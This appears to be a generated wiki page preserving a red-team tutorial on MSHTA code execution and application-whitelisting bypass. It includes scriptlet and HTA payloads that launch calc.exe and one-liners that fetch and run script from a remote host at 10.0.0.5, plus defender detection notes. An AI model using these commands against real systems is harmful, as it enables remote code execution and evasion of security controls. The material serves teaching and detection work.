---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# MSHTA

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1170-mshta-code-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1170-mshta-code-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MSHTA](../../topics/offensive-security/mshta.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-t1170-mshta-code-execution |
| name | MSHTA |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/t1170-mshta-code-execution.md |

## Preserved Source Material

````yaml
_asset_filenames:
- mshta-calc.png
- mshta-calc2.png
- mshta-commandline.png
- mshta-connection (1).png
- mshta-url.png
_body: "---\ndescription: MSHTA code execution - bypass application whitelisting.\n---\n\n# MSHTA\n\n## Execution\n\nWriting\
  \ a scriptlet file that will launch calc.exe when invoked:\n\n{% code title=\"http://10.0.0.5/m.sct\" %}\n```markup\n<?XML\
  \ version=\"1.0\"?>\n<scriptlet>\n<registration description=\"Desc\" progid=\"Progid\" version=\"0\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\"\
  ></registration>\n\n<public>\n    <method name=\"Exec\"></method>\n</public>\n\n<script language=\"JScript\">\n<![CDATA[\n\
  \tfunction Exec()\t{\n\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");\n\t}\n]]>\n</script>\n</scriptlet>\n\
  ```\n{% endcode %}\n\nInvoking the scriptlet file hosted remotely:\n\n{% code title=\"attacker@victim\" %}\n```csharp\n\
  # from powershell\n/cmd /c mshta.exe javascript:a=(GetObject(\"script:http://10.0.0.5/m.sct\")).Exec();close();\n```\n{%\
  \ endcode %}\n\n## Observations\n\nAs expected, calc.exe is spawned by mshta.exe. Worth noting that mhsta and cmd exit almost\
  \ immediately after invoking the calc.exe:\n\n![](../../.gitbook/assets/mshta-calc.png)\n\nAs a defender, look at sysmon\
  \ logs for mshta establishing network connections:\n\n![](<../../.gitbook/assets/mshta-connection (1).png>)\n\nAlso, suspicious\
  \ commandlines:\n\n![](../../.gitbook/assets/mshta-commandline.png)\n\n## Bonus\n\nThe hta file can be invoked like so:\n\
  \n```csharp\nmshta.exe http://10.0.0.5/m.hta\n```\n\n![](../../.gitbook/assets/mshta-calc2.png)\n\nor by navigating to the\
  \ file itself, launching it and clicking run:\n\n![](../../.gitbook/assets/mshta-url.png)\n\n{% code title=\"http://10.0.0.5/m.hta\"\
  \ %}\n```markup\n<html>\n<head>\n<script language=\"VBScript\"> \n    Sub RunProgram\n        Set objShell = CreateObject(\"\
  Wscript.Shell\")\n        objShell.Run \"calc.exe\"\n    End Sub\nRunProgram()\n</script>\n</head> \n<body>\n    Nothing\
  \ to see here..\n</body>\n</html>\n```\n{% endcode %}\n\n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1170\"\
  \ %}"
_relative_path: offensive-security/code-execution/t1170-mshta-code-execution.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1170-mshta-code-execution.md
````
